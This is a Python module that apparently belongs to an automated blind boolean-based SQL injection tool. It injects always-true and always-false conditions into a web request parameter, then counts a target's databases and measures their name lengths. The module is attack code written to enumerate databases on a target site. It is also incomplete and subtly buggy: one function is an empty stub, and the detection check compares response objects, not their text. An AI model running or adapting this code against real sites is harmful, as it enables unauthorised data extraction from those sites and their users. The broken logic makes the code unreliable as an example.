from HandleRequests import *
from STRINGS import *


async def check_if_boolean_based_is_possible(request, parameter, comment, session):
    """
    check if blind boolean based sqli is possible by sending an always true parameter, an always false parameter and
    comparing the results
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :param comment: the comment chars
    :return: a tuple of the reponses in case of false and true queries, and NOT_DETECTED if they are identical
    """
    boolean_false = await send_sql_request(request, parameter, BLIND_BOOLEAN_ALWAYS_FALSE % comment, session)
    boolean_true = await send_sql_request(request, parameter, BLIND_BOOLEAN_ALWAYS_TRUE % comment, session)
    reponse_true = await boolean_true.text()
    reponse_false = await boolean_false.text()
    if boolean_true != boolean_false:
        print(BOOLEAN_BSQLI_ENABLED)
        return reponse_false, reponse_true
    print(BOOLEAN_BSQLI_DISABLED)
    return NOT_DETECTED


async def find_number(request, parameter, true_and_false_responses, query, limit, session):
    """
    returns a number, handles counting
    :param request: the HTTPRequest object we will modify
    :param parameter: the exploitable parameter
    :param comment: the comment char
    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
    :param query: the query we want to send to the sql server. should check something about a number, and use our index in every iteration
    :param limit: a high bound for the for loop
    :return: the number requested
    """
    for i in range(limit):
        response = await send_sql_request(request, parameter, query % str(i), session)
        response_text = await response.text()
        if response_text != true_and_false_responses[BOOLEAN_FALSE_RESPONSE_INDEX]:
            return i
    return NOT_DETECTED


def find_letter_in_string(request, parameter, true_and_false_responses, query, session):
    """

    :param request:
    :param parameters:
    :param true_and_false_responses:
    :param query:
    :return:
    """
    #response = send_sql_request(request, parameter, )


async def find_word(request, parameter, query, true_and_false_responses, session):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_responses:
    :return:
    """
    length_of_word = await find_number(request, parameter, true_and_false_responses, query, MAX_LEN_OF_STRING, session)
    print(length_of_word)
    return length_of_word

async def find_db_names(request, parameter, comment, true_and_false_responses, session):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_responses:
    :return:
    """
    num_of_dbs = await find_number(request, parameter, true_and_false_responses,
                             BLIND_BOOLEAN_COUNT_DBS % (STRING_PLACEHOLDER, comment), MAX_NUM_OF_DBS_TO_CHECK, session)
    loop = asyncio.get_event_loop()
    for i in range(num_of_dbs):
        await find_word(request, parameter, BLIND_BOOLEAN_DB_NAME_LENGTH % (i, STRING_PLACEHOLDER, comment), true_and_false_responses, session)

async def boolean_based_injection(request, parameter, comment, session):
    """
    manages the boolean-based injection attempts
    :param request: the request we will modify
    :param parameter: the vulnerable parameter
    :param comment: the comment char
    :return: true if the injection worked
    """
    true_and_false_responses = await check_if_boolean_based_is_possible(request, parameter, comment, session)
    if true_and_false_responses != NOT_DETECTED:  # boolean is possible!
        print(await find_db_names(request, parameter, comment, true_and_false_responses, session))
